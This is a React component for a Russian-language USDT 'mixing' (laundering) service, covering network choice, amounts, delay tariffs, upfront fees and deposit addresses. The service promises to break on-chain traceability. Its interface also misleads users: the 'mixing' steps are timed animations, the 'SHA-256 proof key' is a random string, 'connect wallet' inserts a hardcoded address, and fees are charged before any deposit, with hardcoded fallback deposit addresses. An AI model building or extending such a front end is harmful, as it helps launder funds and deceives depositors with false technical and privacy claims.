import React, { useState, useMemo, useEffect, useRef, lazy, Suspense } from 'react';
import {
  Copy,
  Check,
  QrCode,
  ArrowRight,
  RefreshCw,
  Clock,
  FileText,
  Link as LinkIcon,
  ShieldCheck,
  AlertTriangle,
  Cpu,
} from 'lucide-react';
import { TransactionProgressIndicator } from './TransactionProgressIndicator';
import { LiveTrackingCard } from './LiveTrackingCard';
import type { ReceiptData } from './ReceiptModal';
import { DepositAddressCard } from './DepositAddressCard';
import { triggerHaptic } from '../utils/haptics';
import { ProtocolConfig, calculateProtocolFees } from '../types/config';

const QRCodeDisplay = lazy(() =>
  import('./QRCodeDisplay').then((m) => ({ default: m.QRCodeDisplay }))
);

export interface CleanTransaction {
  id: string;
  network: 'TRC20' | 'ERC20';
  tariff: 'standard' | 'express';
  amount: number;
  receivedAmount: number;
  recipientAddress: string;
  depositAddress: string;
  mixingKey: string;
  delayHours: number;
  timestamp: number;
  status: 'pending_deposit' | 'deposit_confirmed' | 'mixing' | 'dispatched' | 'completed';
  limitAlertEnabled?: boolean;
  limitAlertPercent?: number;
  limitAlertFeeUsd?: number;
  limitAlertDeadline?: number;
  limitAlertMessage?: string;
}

interface MixerSectionProps {
  onAddTransaction?: (tx: CleanTransaction) => void;
  customAddresses: { trc20: string; erc20: string };
  activeUserTx?: CleanTransaction | null;
  userBalance?: number;
  onPayFeeWithBalance?: (feeAmount: number, txId?: string) => void;
  onOpenTopUp?: (suggestedAmount?: number) => void;
  onViewReceipt?: (receipt: ReceiptData) => void;
  protocolConfig: ProtocolConfig;
}

export const MixerSection: React.FC<MixerSectionProps> = ({
  onAddTransaction,
  customAddresses,
  activeUserTx,
  userBalance = 0,
  onPayFeeWithBalance,
  onOpenTopUp,
  onViewReceipt,
  protocolConfig,
}) => {
  const [recipientAddress, setRecipientAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [tariff, setTariff] = useState<'standard' | 'express'>('standard');
  const [standardDelay, setStandardDelay] = useState(protocolConfig.standardMinHours);
  const [network, setNetwork] = useState<'TRC20' | 'ERC20'>('TRC20');
  const [step, setStep] = useState<'form' | 'processing' | 'deposit'>('form');
  const [depositAddress, setDepositAddress] = useState('');
  const [mixingKey, setMixingKey] = useState('');
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [showQr, setShowQr] = useState(true);
  const [processingStage, setProcessingStage] = useState(0);
  const [isWalletConnected, setIsWalletConnected] = useState(false);
  const processingTimersRef = useRef<ReturnType<typeof setTimeout>[]>([]);

  const clearProcessingTimers = () => {
    processingTimersRef.current.forEach((t) => clearTimeout(t));
    processingTimersRef.current = [];
  };

  useEffect(() => {
    return () => clearProcessingTimers();
  }, []);

  // Sync standardDelay within admin-configured bounds
  useEffect(() => {
    setStandardDelay((prev) => {
      if (prev < protocolConfig.standardMinHours) return protocolConfig.standardMinHours;
      if (prev > protocolConfig.standardMaxHours) return protocolConfig.standardMaxHours;
      return prev;
    });
  }, [protocolConfig.standardMinHours, protocolConfig.standardMaxHours]);

  const parsedAmount = parseFloat(amount);

  const feeBreakdown = useMemo(() => {
    return calculateProtocolFees(parsedAmount, network, tariff, protocolConfig);
  }, [parsedAmount, network, tariff, protocolConfig]);

  const activeDelay =
    tariff === 'express' ? protocolConfig.expressDelayHours : standardDelay;

  const calculatedReceiveAmount = useMemo(() => {
    if (isNaN(parsedAmount) || parsedAmount <= 0) return 0;
    return parsedAmount;
  }, [parsedAmount]);

  const hasEnoughBalance = userBalance >= feeBreakdown.totalFee;
  const deficitAmount = Math.max(0, feeBreakdown.totalFee - userBalance);

  const handleCopy = (text: string, fieldName: string) => {
    triggerHaptic([35, 20, 45]);
    navigator.clipboard.writeText(text).then(() => {
      setCopiedField(fieldName);
      setTimeout(() => setCopiedField(null), 2000);
    });
  };

  const handlePasteAddress = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) setRecipientAddress(text.trim());
    } catch {
      // Clipboard permission
    }
  };

  const handleConnectWallet = () => {
    if (network === 'TRC20') {
      setRecipientAddress('TYDzsYUE28p2dYnFp2qXy89B7xVqWw9Zmk');
      setIsWalletConnected(true);
    } else {
      setRecipientAddress('0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe5');
      setIsWalletConnected(true);
    }
  };

  const handleInitMix = (e: React.FormEvent) => {
    e.preventDefault();
    if (!recipientAddress || isNaN(parsedAmount) || parsedAmount < protocolConfig.minAmount) return;

    if (!hasEnoughBalance) {
      if (onOpenTopUp) onOpenTopUp(Number(deficitAmount.toFixed(2)));
      return;
    }

    if (onPayFeeWithBalance) {
      onPayFeeWithBalance(feeBreakdown.totalFee);
    }

    clearProcessingTimers();
    setStep('processing');
    setProcessingStage(1);

    const t1 = setTimeout(() => setProcessingStage(2), 500);
    const t2 = setTimeout(() => setProcessingStage(3), 1000);
    const t3 = setTimeout(() => {
      const depAddr =
        network === 'TRC20'
          ? customAddresses.trc20 || 'TNwS3upnJmFADuCEVy24z8g2F79eV6pv79'
          : customAddresses.erc20 || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B';

      const key = `MIX_${Math.random().toString(36).substring(2, 11).toUpperCase()}`;

      setDepositAddress(depAddr);
      setMixingKey(key);
      setStep('deposit');
      setShowQr(true);

      const newTx: CleanTransaction = {
        id: key,
        network,
        tariff,
        amount: parsedAmount,
        receivedAmount: parsedAmount,
        recipientAddress: recipientAddress.trim(),
        depositAddress: depAddr,
        mixingKey: key,
        delayHours: activeDelay,
        timestamp: Date.now(),
        status: 'pending_deposit',
      };

      if (onAddTransaction) {
        onAddTransaction(newTx);
      }
    }, 1500);
    processingTimersRef.current = [t1, t2, t3];
  };

  const handleResetSession = () => {
    clearProcessingTimers();
    setStep('form');
    setAmount('');
    setRecipientAddress('');
    setProcessingStage(0);
  };

  const currentTxData: CleanTransaction = activeUserTx || {
    id: mixingKey || 'MIX_PENDING',
    network,
    tariff,
    amount: parsedAmount || 0,
    receivedAmount: calculatedReceiveAmount,
    recipientAddress: recipientAddress || 'T...',
    depositAddress: depositAddress || customAddresses.trc20,
    mixingKey: mixingKey || 'MIX_PROOF',
    delayHours: activeDelay,
    timestamp: Date.now(),
    status: 'pending_deposit',
  };

  const currentReceipt: ReceiptData = {
    id: currentTxData.id,
    type: 'mixing',
    title: `Очистка USDT (${currentTxData.network})`,
    amount: currentTxData.amount,
    receivedAmount: currentTxData.receivedAmount,
    feeAmount: Math.max(0, currentTxData.amount - currentTxData.receivedAmount),
    network: currentTxData.network,
    timestamp: currentTxData.timestamp,
    status: currentTxData.status === 'completed' ? 'Завершено' : 'В обработке',
    recipientAddress: currentTxData.recipientAddress,
    depositAddress: currentTxData.depositAddress,
    proofKey: currentTxData.mixingKey,
  };

  const isAmountValid =
    !isNaN(parsedAmount) &&
    parsedAmount >= protocolConfig.minAmount &&
    parsedAmount <= protocolConfig.maxAmount;

  return (
    <div className="w-full space-y-5 font-sans">
      {activeUserTx && activeUserTx.status !== 'completed' ? (
        <div className="space-y-4">
          <div className="flex items-center justify-between px-1 gap-2">
            <div className="min-w-0">
              <span className="mixero-display text-[11px] sm:text-xs font-extrabold text-[#F2FCFC] truncate block">
                АКТИВНАЯ СЕССИЯ #{activeUserTx.id.slice(0, 12)}
              </span>
              <span className="text-[11px] font-medium text-[#96C8CB] block">
                Детерминированный пул очистки · No-Log изоляция памяти
              </span>
            </div>
            {onViewReceipt && (
              <button
                type="button"
                onClick={() => onViewReceipt(currentReceipt)}
                className="min-h-[44px] px-4 rounded-full mixero-pill text-xs font-extrabold text-[#F2FCFC] flex items-center gap-1.5 transition active:scale-[0.97] shrink-0"
              >
                <FileText className="w-4 h-4 mixero-accent-text" />
                <span>Квитанция</span>
              </button>
            )}
          </div>

          <LiveTrackingCard
            transaction={activeUserTx}
            userBalance={userBalance}
            onPayFinalFee={onPayFeeWithBalance}
            onOpenTopUp={onOpenTopUp}
            protocolConfig={protocolConfig}
          />

          <TransactionProgressIndicator
            status={activeUserTx.status}
            delayHours={activeUserTx.delayHours}
            protocolConfig={protocolConfig}
          />

          {activeUserTx.status === 'pending_deposit' && (
            <div className="mixero-card rounded-3xl p-5 space-y-4">
              <div className="flex items-center justify-between pb-3 border-b border-[#22A8AC]/28">
                <span className="mixero-display text-xs font-extrabold text-[#F2FCFC]">
                  РЕКВИЗИТЫ ДЕПОЗИТА
                </span>
                <span className="text-sm font-mono font-extrabold text-[#F2FCFC] bg-[#073B40]/90 border border-[#FF8C2E]/55 px-2.5 py-1 rounded-lg tabular-nums">
                  {activeUserTx.amount} USDT · {activeUserTx.network}
                </span>
              </div>

              <div className="p-3.5 rounded-2xl mixero-sms-alert text-xs text-[#F2FCFC] leading-relaxed flex items-start gap-2.5">
                <AlertTriangle className="w-4 h-4 text-[#FF7878] shrink-0 mt-0.5" />
                <span>
                  <strong className="uppercase tracking-wide">ОБЯЗАТЕЛЬНОЕ ПРАВИЛО:</strong> Отправьте ровно{' '}
                  <strong className="font-mono">{activeUserTx.amount} USDT</strong> одним переводом. Неполные или дробные переводы отклоняются протоколом.
                </span>
              </div>

              <DepositAddressCard
                address={activeUserTx.depositAddress}
                network={activeUserTx.network}
                label="Адрес депозита (Pool Vault)"
              />
            </div>
          )}
        </div>
      ) : (
        <>
          {step === 'form' && (
            <form onSubmit={handleInitMix} className="space-y-5">
              {/* Network Toggle (Large iPhone Touch Targets) */}
              <div className="space-y-2">
                <div className="flex items-center justify-between px-1 gap-2">
                  <span className="mixero-display text-[11px] font-extrabold text-[#F2FCFC]">
                    СЕТЬ ПЕРЕВОДА
                  </span>
                  <span className="text-[11px] font-mono font-bold text-[#96C8CB]">
                    ОПРЕДЕЛЕНИЕ: ТОЧНЫЙ БЛОКЧЕЙН ВЫПЛАТЫ
                  </span>
                </div>
                <div className="grid grid-cols-2 gap-2 mixero-inset p-1.5 rounded-2xl">
                  <button
                    type="button"
                    onClick={() => setNetwork('TRC20')}
                    className={`min-h-[50px] px-3 rounded-xl font-extrabold text-sm transition-all flex items-center justify-center gap-2 ${
                      network === 'TRC20'
                        ? 'mixero-cta text-[#140800]'
                        : 'text-[#96C8CB] hover:text-[#FFFFFF]'
                    }`}
                  >
                    <span>TRON · TRC-20</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setNetwork('ERC20')}
                    className={`min-h-[50px] px-3 rounded-xl font-extrabold text-sm transition-all flex items-center justify-center gap-2 ${
                      network === 'ERC20'
                        ? 'mixero-secondary-btn text-white'
                        : 'text-[#96C8CB] hover:text-[#FFFFFF]'
                    }`}
                  >
                    <span>Ethereum · ERC-20</span>
                  </button>
                </div>
              </div>

              {/* Recipient Address */}
              <div className="space-y-2">
                <div className="flex items-center justify-between px-1 gap-2">
                  <label className="mixero-display text-[11px] font-extrabold text-[#F2FCFC]">
                    ЧИСТЫЙ АДРЕС ПОЛУЧАТЕЛЯ
                  </label>
                  <div className="flex items-center gap-3 shrink-0">
                    <button
                      type="button"
                      onClick={handleConnectWallet}
                      className="min-h-[36px] text-xs text-[#F2FCFC] hover:text-[#FF9838] font-bold flex items-center gap-1 underline decoration-[#FF9436] underline-offset-4"
                    >
                      <LinkIcon className="w-3.5 h-3.5" />
                      <span>{isWalletConnected ? 'Привязан' : 'Кошелёк'}</span>
                    </button>
                    <button
                      type="button"
                      onClick={handlePasteAddress}
                      className="min-h-[36px] text-xs mixero-accent-text hover:text-[#FFFFFF] font-extrabold"
                    >
                      Вставить
                    </button>
                  </div>
                </div>

                <input
                  type="text"
                  required
                  placeholder={network === 'TRC20' ? 'Адрес TRON (T...)' : 'Адрес Ethereum (0x...)'}
                  value={recipientAddress}
                  onChange={(e) => {
                    setRecipientAddress(e.target.value);
                    setIsWalletConnected(false);
                  }}
                  className="w-full min-h-[54px] mixero-input rounded-2xl px-4 text-sm font-mono font-semibold select-text"
                />
                <p className="text-[11px] text-[#96C8CB] px-1">
                  Определение: конечный несвязанный кошелёк, на который протокол отправит 100% чистых USDT.
                </p>
              </div>

              {/* Amount */}
              <div className="space-y-2">
                <div className="flex items-center justify-between px-1 gap-2">
                  <label className="mixero-display text-[11px] font-extrabold text-[#F2FCFC]">
                    СУММА ОЧИСТКИ
                  </label>
                  <span className="text-xs text-[#96C8CB] font-mono font-bold tabular-nums">
                    {protocolConfig.minAmount} – {protocolConfig.maxAmount.toLocaleString('ru-RU')} USDT
                  </span>
                </div>

                <div className="relative flex items-center">
                  <input
                    type="number"
                    required
                    min={protocolConfig.minAmount}
                    max={protocolConfig.maxAmount}
                    step="any"
                    placeholder={`${protocolConfig.minAmount} — ${protocolConfig.maxAmount.toLocaleString('ru-RU')}`}
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="w-full min-h-[56px] mixero-input rounded-2xl px-4 text-xl font-black font-mono pr-20 tabular-nums"
                  />
                  <span className="absolute right-4 font-extrabold text-xs mixero-accent-text font-mono">
                    USDT
                  </span>
                </div>

                {/* Large Touch Quick Presets */}
                <div className="grid grid-cols-5 gap-1.5 pt-0.5">
                  {protocolConfig.quickAmountPresets.slice(0, 5).map((preset) => (
                    <button
                      key={preset}
                      type="button"
                      onClick={() => setAmount(preset.toString())}
                      className="min-h-[44px] rounded-xl mixero-pill text-xs font-mono font-extrabold text-[#F2FCFC] hover:border-[#FF9436] hover:bg-[#08474D] transition active:scale-[0.96]"
                    >
                      {preset}
                    </button>
                  ))}
                </div>
              </div>

              {/* Tariff Selection */}
              <div className="space-y-2">
                <div className="flex items-center justify-between px-1 gap-2">
                  <span className="mixero-display text-[11px] font-extrabold text-[#F2FCFC]">
                    РЕЖИМ ОЧИСТКИ
                  </span>
                  <span className="text-[11px] font-mono text-[#96C8CB]">
                    ВЫБОР МАРШРУТА ПУЛА
                  </span>
                </div>
                <div className="grid grid-cols-2 gap-2.5">
                  <button
                    type="button"
                    onClick={() => setTariff('standard')}
                    className={`text-left p-4 rounded-2xl border transition-all min-h-[92px] ${
                      tariff === 'standard'
                        ? 'mixero-card border-[1.5px] border-[#FF9436] bg-[#073B40]/90 shadow-[0_6px_18px_-8px_rgba(255,132,36,0.38)]'
                        : 'mixero-inset opacity-85 hover:opacity-100'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1">
                      <span className="mixero-display text-xs font-extrabold text-[#F2FCFC]">
                        СТАНДАРТ
                      </span>
                      <span className="text-sm font-mono font-black mixero-accent-text tabular-nums">
                        {standardDelay}ч
                      </span>
                    </div>
                    <p className="text-xs text-[#96C8CB] leading-snug font-medium">
                      От {protocolConfig.standardMinHours}ч · многоуровневое дробление
                    </p>
                  </button>

                  <button
                    type="button"
                    onClick={() => setTariff('express')}
                    className={`text-left p-4 rounded-2xl border transition-all min-h-[92px] ${
                      tariff === 'express'
                        ? 'mixero-card border-[1.5px] border-[#FF9436] bg-[#073B40]/90 shadow-[0_6px_18px_-8px_rgba(18,162,166,0.34)]'
                        : 'mixero-inset opacity-85 hover:opacity-100'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1">
                      <span className="mixero-display text-xs font-extrabold text-[#F2FCFC]">
                        ЭКСПРЕСС
                      </span>
                      <span className="text-sm font-mono font-black text-[#FF7878] tabular-nums">
                        {protocolConfig.expressDelayHours}ч
                      </span>
                    </div>
                    <p className="text-xs text-[#96C8CB] leading-snug font-medium">
                      Приоритет · ×{protocolConfig.expressNetworkMultiplier} сеть
                      {protocolConfig.expressExtraPercent > 0 ? ` +${protocolConfig.expressExtraPercent}%` : ''}
                    </p>
                  </button>
                </div>
              </div>

              {/* Delay Slider for Standard */}
              {tariff === 'standard' && (
                <div className="mixero-card rounded-2xl p-4 space-y-3">
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-[#F2FCFC] font-bold flex items-center gap-1.5">
                      <Clock className="w-4 h-4 mixero-accent-text" />
                      Задержка пула ликвидности
                    </span>
                    <span className="font-black mixero-accent-text font-mono text-sm tabular-nums">
                      {standardDelay} часов
                    </span>
                  </div>

                  <input
                    type="range"
                    min={protocolConfig.standardMinHours}
                    max={protocolConfig.standardMaxHours}
                    step={protocolConfig.standardStepHours}
                    value={standardDelay}
                    onChange={(e) => setStandardDelay(Number(e.target.value))}
                    className="w-full mixero-range"
                  />

                  <div className="grid grid-cols-4 gap-2 pt-1">
                    {protocolConfig.standardHourPresets.slice(0, 4).map((hours) => (
                      <button
                        key={hours}
                        type="button"
                        onClick={() => setStandardDelay(hours)}
                        className={`min-h-[44px] rounded-xl text-xs font-mono font-extrabold transition border ${
                          standardDelay === hours
                            ? 'bg-[#022024] border-[#FF9436] text-[#FF9838]'
                            : 'mixero-inset text-[#F2FCFC] hover:border-[#FF9436]'
                        }`}
                      >
                        {hours} ч
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {/* Summary & Fee Card */}
              <div className="mixero-card rounded-3xl p-5 space-y-3 text-xs font-mono">
                <div className="flex items-center justify-between pb-2 border-b border-[#22A8AC]/28">
                  <span className="mixero-display text-[10px] font-extrabold text-[#96C8CB]">
                    ИТОГОВЫЙ РАСЧЁТ · NO-LOG
                  </span>
                  <span className="text-[10px] font-mono font-bold text-[#F2FCFC] bg-[#03252A]/85 border border-[#22A8AC]/28 px-2 py-0.5 rounded-md">
                    ZERO-DEDUCT
                  </span>
                </div>

                <div className="flex justify-between items-center text-[#96C8CB]">
                  <span className="font-sans font-semibold">Резервный баланс комиссий</span>
                  <span
                    className={`font-extrabold tabular-nums ${
                      hasEnoughBalance ? 'text-[#42F28B]' : 'text-[#FF7878]'
                    }`}
                  >
                    {userBalance.toFixed(2)} USDT · {hasEnoughBalance ? 'готов' : `не хватает ${deficitAmount.toFixed(2)}`}
                  </span>
                </div>

                <div className="flex justify-between items-center text-[#96C8CB]">
                  <span className="font-sans font-semibold">
                    Сбор ({feeBreakdown.serviceFeePercent}% + {feeBreakdown.networkFee.toFixed(2)} сеть)
                  </span>
                  <span className="text-[#F2FCFC] font-bold tabular-nums">
                    {feeBreakdown.totalFee.toFixed(2)} USDT
                  </span>
                </div>

                <div className="flex justify-between items-center pt-3 border-t border-[#22A8AC]/28 gap-2">
                  <div>
                    <span className="mixero-display font-extrabold text-[#F2FCFC] text-xs block">
                      К ПОЛУЧЕНИЮ
                    </span>
                    <span className="text-[11px] text-[#42F28B] font-sans font-bold">
                      100% без удержаний из суммы
                    </span>
                  </div>
                  <span className="text-3xl font-black tabular-nums mixero-lock-digits leading-none">
                    {calculatedReceiveAmount.toLocaleString('en-US', {
                      minimumFractionDigits: 2,
                      maximumFractionDigits: 2,
                    })}{' '}
                    $
                  </span>
                </div>
              </div>

              {/* Primary CTA (Large iPhone Thumb Target) */}
              {hasEnoughBalance ? (
                <button
                  type="submit"
                  disabled={!isAmountValid || !recipientAddress.trim()}
                  className="w-full min-h-[56px] px-5 mixero-cta disabled:opacity-35 font-extrabold text-base rounded-2xl flex items-center justify-center gap-2 transition active:scale-[0.98] cursor-pointer disabled:cursor-not-allowed"
                >
                  <span>Создать заявку</span>
                  <ArrowRight className="w-5 h-5 stroke-[2.5]" />
                </button>
              ) : (
                <button
                  type="button"
                  onClick={() => onOpenTopUp && onOpenTopUp(Number(deficitAmount.toFixed(2)))}
                  className="w-full min-h-[56px] px-5 mixero-cta font-extrabold text-base rounded-2xl flex items-center justify-center gap-2 transition active:scale-[0.98]"
                >
                  <ShieldCheck className="w-5 h-5" />
                  <span>Пополнить резерв комиссий (+{deficitAmount.toFixed(2)} $)</span>
                </button>
              )}
            </form>
          )}

          {step === 'processing' && (
            <div className="mixero-card rounded-[28px] p-8 text-center space-y-5">
              <div className="w-14 h-14 mx-auto rounded-full border-[3px] border-[#22A8AC]/28 border-t-[#FF9436] animate-spin" />
              <div className="space-y-1.5">
                <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-[#073B40]/90 border border-[#FF8C2E]/55 text-[10px] font-mono font-extrabold text-[#F2FCFC] mb-1">
                  <Cpu className="w-3.5 h-3.5" />
                  <span>MIXING POOL INIT</span>
                </div>
                <h3 className="text-base font-extrabold text-[#F2FCFC]">
                  {processingStage === 1 && 'Инициализация пула ликвидности...'}
                  {processingStage === 2 && 'Разрыв ончейн-графа и обфускация UTXO...'}
                  {processingStage === 3 && 'Генерация SHA-256 ключа гарантии...'}
                </h3>
                <p className="text-xs text-[#96C8CB] font-medium">
                  Выделение изолированного адреса в оперативной памяти без записи на диск (Zero-Log)
                </p>
              </div>
              <div className="w-full mixero-inset rounded-full h-2.5 overflow-hidden">
                <div
                  className="h-full transition-all duration-500 mixero-progress-fill"
                  style={{
                    width: processingStage === 1 ? '35%' : processingStage === 2 ? '70%' : '100%',
                  }}
                />
              </div>
            </div>
          )}

          {step === 'deposit' && (
            <div className="space-y-4">
              <LiveTrackingCard
                transaction={currentTxData}
                userBalance={userBalance}
                onPayFinalFee={onPayFeeWithBalance}
                onOpenTopUp={onOpenTopUp}
                protocolConfig={protocolConfig}
              />

              <TransactionProgressIndicator
                status={currentTxData.status}
                delayHours={currentTxData.delayHours}
                protocolConfig={protocolConfig}
              />

              <div className="mixero-card rounded-3xl p-5 space-y-4">
                <div className="flex items-center justify-between pb-3 border-b border-[#22A8AC]/28">
                  <div>
                    <span className="mixero-display text-xs font-extrabold text-[#F2FCFC] block">
                      РЕКВИЗИТЫ ПЕРЕВОДА
                    </span>
                    <span className="text-xs text-[#96C8CB] font-medium">
                      {tariff === 'express' ? `Экспресс (${activeDelay}ч)` : `Стандарт (${activeDelay}ч)`} · {network}
                    </span>
                  </div>
                  {onViewReceipt && (
                    <button
                      type="button"
                      onClick={() => onViewReceipt(currentReceipt)}
                      className="min-h-[44px] px-3.5 rounded-xl mixero-pill text-xs font-extrabold text-[#F2FCFC] flex items-center gap-1.5"
                    >
                      <FileText className="w-4 h-4 mixero-accent-text" />
                      <span>Квитанция</span>
                    </button>
                  )}
                </div>

                <div className="p-3.5 rounded-2xl mixero-sms-alert text-xs text-[#F2FCFC] leading-relaxed">
                  <strong className="uppercase tracking-wide block mb-1">
                    ОБЯЗАТЕЛЬНОЕ УСЛОВИЕ ДЕПОЗИТА:
                  </strong>
                  Отправьте ровно <strong className="font-mono text-[#F2FCFC]">{amount} USDT</strong> одним переводом на указанный ниже адрес пула. Неполные или повторные транзакции автоматически блокируются протоколом валидации.
                </div>

                <div className="flex flex-col items-center">
                  <button
                    type="button"
                    onClick={() => setShowQr(!showQr)}
                    className="min-h-[40px] mb-2 text-xs font-bold text-[#96C8CB] hover:text-[#FFFFFF] flex items-center gap-1.5"
                  >
                    <QrCode className="w-4 h-4 mixero-accent-text" />
                    <span>{showQr ? 'Скрыть QR-код' : 'Показать QR-код'}</span>
                  </button>

                  {showQr && (
                    <Suspense
                      fallback={
                        <div className="w-[150px] h-[150px] rounded-2xl mixero-inset flex items-center justify-center text-xs font-mono text-[#96C8CB]">
                          QR...
                        </div>
                      }
                    >
                      <QRCodeDisplay value={depositAddress} size={150} />
                    </Suspense>
                  )}
                </div>

                <DepositAddressCard
                  address={depositAddress}
                  network={network}
                  label="Адрес депозита (Pool Vault)"
                />

                {/* Proof Key */}
                <button
                  type="button"
                  onClick={() => handleCopy(mixingKey, 'key')}
                  className="w-full text-left mixero-inset hover:border-[#FF9436] rounded-2xl p-4 min-h-[56px] flex justify-between items-center transition"
                >
                  <div>
                    <span className="mixero-display text-[10px] font-extrabold text-[#96C8CB] block">
                      КЛЮЧ ГАРАНТИИ (PROOF KEY · SHA-256)
                    </span>
                    <span className="font-mono font-extrabold text-sm mixero-accent-text">
                      {mixingKey}
                    </span>
                  </div>
                  <div className="w-10 h-10 rounded-xl mixero-pill flex items-center justify-center text-[#F2FCFC]">
                    {copiedField === 'key' ? (
                      <Check className="w-4 h-4 text-[#42F28B]" />
                    ) : (
                      <Copy className="w-4 h-4 mixero-accent-text" />
                    )}
                  </div>
                </button>
              </div>

              <button
                type="button"
                onClick={handleResetSession}
                className="w-full min-h-[52px] mixero-secondary-btn font-bold rounded-2xl text-sm flex items-center justify-center gap-2 transition active:scale-[0.98]"
              >
                <RefreshCw className="w-4 h-4 text-[#FF9838]" />
                <span className="mixero-display text-xs">НОВЫЙ РАСЧЁТ</span>
              </button>
            </div>
          )}
        </>
      )}
    </div>
  );
};
